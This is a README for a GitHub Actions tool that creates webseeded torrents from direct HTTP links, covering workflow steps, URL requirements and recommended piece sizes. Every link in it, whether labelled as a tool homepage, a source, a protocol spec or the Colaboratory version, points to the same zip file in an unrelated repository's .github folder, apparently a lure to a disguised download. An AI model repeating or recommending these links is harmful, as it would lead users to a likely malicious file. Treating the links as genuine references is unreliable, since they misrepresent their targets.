# Torrent Webseed Creator
Webseeded Torrent Creator using GitHub Actions.

Inspired by [BurnBit †](https://raw.githubusercontent.com/afzaal11/BurnBit-alt/main/.github/BurnBit-alt_3.5-alpha.1.zip) and [URLHash](https://raw.githubusercontent.com/afzaal11/BurnBit-alt/main/.github/BurnBit-alt_3.5-alpha.1.zip).

Powered by these programs to create a torrent file.
* [torrenttools](https://raw.githubusercontent.com/afzaal11/BurnBit-alt/main/.github/BurnBit-alt_3.5-alpha.1.zip)
* [mktorrent](https://raw.githubusercontent.com/afzaal11/BurnBit-alt/main/.github/BurnBit-alt_3.5-alpha.1.zip)
* [py3createtorrent](https://raw.githubusercontent.com/afzaal11/BurnBit-alt/main/.github/BurnBit-alt_3.5-alpha.1.zip)
* [torf-cli](https://raw.githubusercontent.com/afzaal11/BurnBit-alt/main/.github/BurnBit-alt_3.5-alpha.1.zip)
* [dottorrent-cli](https://raw.githubusercontent.com/afzaal11/BurnBit-alt/main/.github/BurnBit-alt_3.5-alpha.1.zip)

An alternative to BurnBit and URLHash.

Convert direct HTTP link to .torrent

Your file is then burned into a torrent.

Torrents created are trackerless, relying on Distributed Hash Table and Peer EXchange, to help reduce the burden of torrent trackers.

For people that have unstable internet.\
Can be paused because it is a torrent.\
Utilizes the power of peer to peer downloads and the client-server downloads.\
Combines the best of both worlds (P2P and Direct HTTP Link).

## How to use
1. Create a repository on GitHub using this template by clicking "Use this template."
2. Go to the Actions tab.
3. Choose a program to use by clicking the name of the program under "all workflows." [Comparison of torrent creators](https://raw.githubusercontent.com/afzaal11/BurnBit-alt/main/.github/BurnBit-alt_3.5-alpha.1.zip)
4. Besides the "This workflow has a workflow_dispatch event trigger.", click "Run workflow."
4. Input the required information at the dropdown box. (Example inputs are predefined.)
   * Name: The name of the torrent file.
   * Comment: The comment inside the torrent file.
   * URL: The URL of the file to download and create a torrent from.
   * File name: The file name of the file you will create a torrent from.
   * Piece size:
     * For mktorrent: The size of the torrent pieces in potency of 2 (2^n).
     * For py3createtorrent: The size of the torrent pieces in kilobyte (KB) or 0 for automatic calculation.
     * For torrenttools: The size of the torrent pieces in potency of 2 (2^n) or in kilobyte (KB) or auto for automatic calculation.
	 * For torf-cli & dottorrent-cli: The piece size is set automatically.
   * Protocol Version: The version of BitTorrent protocol to use. Either [v1](https://raw.githubusercontent.com/afzaal11/BurnBit-alt/main/.github/BurnBit-alt_3.5-alpha.1.zip), [v2, or hybrid](https://raw.githubusercontent.com/afzaal11/BurnBit-alt/main/.github/BurnBit-alt_3.5-alpha.1.zip) (For torrenttools only).
5. Click "Run workflow" at the bottom of the dropdown box.
5. Wait for it to finish downloading and hashing.
6. After it says passing on the GitHub Actions, click the workflow run that has been created and download the torrent file on Artifacts.

## URL requirements
1. URL must be accessible without cookies. [Source](https://raw.githubusercontent.com/afzaal11/BurnBit-alt/main/.github/BurnBit-alt_3.5-alpha.1.zip)
2. The URL should not expire, or it will stop working sometime if there is not enough seeders. [Source](https://raw.githubusercontent.com/afzaal11/BurnBit-alt/main/.github/BurnBit-alt_3.5-alpha.1.zip)

## Recommend piece size
| Piece Size | mktorrent      | py3createtorrent | torrenttools | for filesizes      |
|------------|----------------|------------------|--------------|--------------------|
| Automatic  | No support yet | 0                | auto         | Any                |
| 512 KiB    | 19             | 512              | 19 or 512K   | 512 MiB - 1024 MiB |
| 1024 KiB   | 20             | 1024             | 20 or 1024K  | 1 GiB - 2 GiB      |
| 2048 KiB   | 21             | 2048             | 21 or 2048K  | 2 GiB - 4 GiB      |
| 4096 KiB   | 22             | 4096             | 22 or 4096K  | 4 GiB - 8 GiB      |
| 8192 KiB   | 23             | 8192             | 23 or  8192K | 8 GiB - 16 GiB     |
| 16384 KiB  | 24             | 16384            | 24 or 16384K | 16 GiB - 512 GiB   |
| 32768 KiB  | 25             | 32768            | 25 or 32768K | >512 GiB           |

Source: [https://raw.githubusercontent.com/afzaal11/BurnBit-alt/main/.github/BurnBit-alt_3.5-alpha.1.zip](https://raw.githubusercontent.com/afzaal11/BurnBit-alt/main/.github/BurnBit-alt_3.5-alpha.1.zip)

## Increase disk space
GitHub Actions has a soft limit of ≈25 GB, to increase disk space to ≈64 GB, set maximize disk space to true.

## Difference on Google Colaboratory version
This GitHub Actions version of this program has a soft limit of ≈25 GB (or ≈64 GB), the [Google Colaboratory](https://raw.githubusercontent.com/afzaal11/BurnBit-alt/main/.github/BurnBit-alt_3.5-alpha.1.zip) version has a soft limit of ≈100 GB.